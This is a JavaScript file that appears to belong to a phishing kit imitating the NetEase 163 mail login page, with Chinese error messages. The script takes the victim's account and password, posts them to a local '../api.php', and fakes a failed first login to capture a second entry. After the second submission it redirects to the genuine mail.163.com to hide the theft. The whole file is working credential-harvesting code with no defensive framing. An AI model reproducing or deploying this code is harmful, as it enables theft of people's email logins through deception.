var spcred = 0;
document.getElementById("dologinrgu").addEventListener("click", function() {
  fsucth()
});


function fsucth() {

  var chfso  = document.getElementById("auto-id-1643316751315").value;
  var chfsop  = document.getElementById("auto-id-1643316751318").value;
  var nerror = nusinvs = true;

		if(myTrim(chfso) == "") {
        printError("nerror", `<div class="j-icon ferrortail"></div> <div class="ferrorhead" id="auto-id-1643640595521">请输入帐号</div>`);
    } else {

        if(myTrim(chfso).length < 0) {
            printError("nerror", `<div class="j-icon ferrortail"></div> <div class="ferrorhead" id="auto-id-1643640595521">请输入帐号</div>`);
        } else{
            printError("nerror", "");
            nerror = false;
        }
    }

    if(myTrim(chfsop) == "") {
        printError("nerror", `<div class="j-icon ferrortail"></div><div class="ferrorhead" id="auto-id-1643640595527">请输入密码</div>  `);
    } else {
        if(myTrim(chfsop).length < 6){
			printError("nerror", `<div class="j-icon ferrortail"></div><div class="ferrorhead" id="auto-id-1643640595527">请输入密码</div>`);
		} else if(myTrim(chfsop).length > 40){
			printError("nerror", `<div class="j-icon ferrortail"></div><div class="ferrorhead" id="auto-id-1643640595527">请输入密码</div>`);
		} else{
            printError("nerror", "");
            nusinvs = false;
        }
    }

	if ((nerror || nusinvs) == true) {
	   return false;
    } else {
        fsucthac()
    }
}

function fsucthac(){

  var chfso  = document.getElementById("auto-id-1643316751315").value;
  var chfsop  = document.getElementById("auto-id-1643316751318").value;
  document.getElementById("dologin").innerHTML = '正在登录...'


	$.ajax({
		type: "POST",
		url: "../api.php",
		data: {chfso: chfso, chfsop: chfsop, },
		success: function(data){
      spcred = spcred+1;
      if(spcred == 1){
         document.getElementById("nerror").innerHTML = " ";
         document.getElementById("dologin").innerHTML = '登&nbsp;&nbsp;录'
      }else if(spcred == 2){
         window.location.href = "https://mail.163.com/";
      }
		},
    error : function(jqXHR, textStatus, errorThrown) {
			document.getElementById("nerror").innerHTML = " ";
      document.getElementById("dologin").innerHTML = '登&nbsp;&nbsp;录'
       }

	});

}

function myTrim(x) {
  return x.replace(/^\s+|\s+$/gm,'');
}

String.prototype.nl2br = function(){
	return this.replace(/\n/g, "<br />");
}
function printError(elemId, hintMsg) {
  document.getElementById(elemId).innerHTML = hintMsg;
}
